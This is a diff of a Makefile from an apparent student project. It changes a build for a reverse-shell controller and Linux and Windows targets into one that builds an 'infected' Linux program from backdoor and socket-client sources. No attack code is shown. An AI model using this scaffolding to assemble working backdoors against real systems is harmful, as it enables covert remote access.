@@ -1,50 +1,56 @@
-CONTROLLER = controller
-TARGET_LINUX = target_linux
-TARGET_WINDOWS = target_windows.exe
+# **************************************************************************** #
+#                                                                              #
+#                                                         :::      ::::::::    #
+#    Makefile                                           :+:      :+:    :+:    #
+#                                                     +:+ +:+         +:+      #
+#    By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+         #
+#                                                 +#+#+#+#+#+   +#+            #
+#    Created: 2026/01/10 19:15:36 by joesanto          #+#    #+#              #
+#    Updated: 2026/01/10 19:51:41 by joesanto         ###   ########.fr        #
+#                                                                              #
+# **************************************************************************** #
 
-SRCS_CONTROLLER = controller.c
-OBJS_CONTROLLER = $(SRCS_CONTROLLER:.c=.o)
-
-SRCS_TARGET = target.c
-OBJS_TARGET = $(SRCS_TARGET:.c=.o)
-
-LIBS_DIR = libs
-LIBFT = $(LIBS_DIR)/libft/libft.a
-
-CC = gcc
-CC_WIN = i686-w64-mingw32-gcc-win32
+CC = cc
 FLAGS = -Wall -Wextra -Werror -g
-HEADER = reverse_shell.h
-INCLUDES = $(addprefix -I, $(LIBS_DIR)/libft)
+SRCS_DIR = srcs
+INFECT_PROGRAM = $(SRCS_DIR)/program_test.c
 
-all: $(CONTROLLER) $(TARGET_LINUX) $(TARGET_WINDOWS)
+# ----------------------------------- BINS ----------------------------------- #
+BIN_DIR = bin
+PROGRAM_NAME := $(notdir $(basename $(INFECT_PROGRAM)))
 
-$(CONTROLLER): $(LIBFT) $(OBJS_CONTROLLER)
-	$(CC) $(OBJS_CONTROLLER) $(LIBFT) -o $@
+# CLIENT
+LINUX_INFECTED_PROGRAM = $(BIN_DIR)/linux_infected_$(PROGRAM_NAME)
 
-$(TARGET_LINUX): $(OBJS_TARGET)
-	$(CC) $(OBJS_TARGET) -o $@
+# SERVER
+BERKELEY_SERVER = $(BIN_DIR)/berkeley_server
 
-$(TARGET_WINDOWS): $(SRCS_TARGET)
-	$(CC_WIN) $^ -lws2_32 -o $@
+# ---------------------------------- SOURCES --------------------------------- #
 
-$(LIBFT):
-	@if [ ! -d "$(dir $@)" ]; then \
-		git clone git@github.com:joelsantossouza/libft.git $(dir $@); \
-	fi
-	make -C $(dir $@)
+# CLIENT
+LINUX_CLIENT_DIR = $(SRCS_DIR)/client
+BACKDOORS_DIR = $(SRCS_DIR)/backdoors
+SOCKET_CONNECTION_DIR = $(SRCS_DIR)/socket_client_connection
 
-%.o: %.c $(HEADER)
-	$(CC) $(FLAGS) $(INCLUDES) -c $< -o $@
+SOCKET_CONNECTION_SRCS = $(addprefix $(SOCKET_CONNECTION_DIR)/, \
+						 berkeley_client_connection.c \
+)
+LINUX_CLIENT_OBJS += $(SOCKET_CONNECTION_SRCS:.c=.o) $(INFECT_PROGRAM:.c=.o)
+
+# -------------------------------- COMPILATION ------------------------------- #
+
+all: $(LINUX_INFECTED_PROGRAM)
+
+$(LINUX_INFECTED_PROGRAM): $(LINUX_CLIENT_OBJS)
+	$(CC) $^ -o $@
+
+%.o: %.c
+	$(CC) $(FLAGS) -c $< -o $@
 
 clean:
-	rm -f $(OBJS_CONTROLLER)
-	rm -f $(OBJS_TARGET)
+	rm -f $(LINUX_CLIENT_OBJS)
 
 fclean: clean
-	rm -f $(CONTROLLER)
-	rm -f $(TARGET_LINUX)
-	rm -f $(TARGET_WINDOWS)
-	rm -rf $(LIBS_DIR)
+	rm -f $(BIN_DIR)
 
 re: fclean all
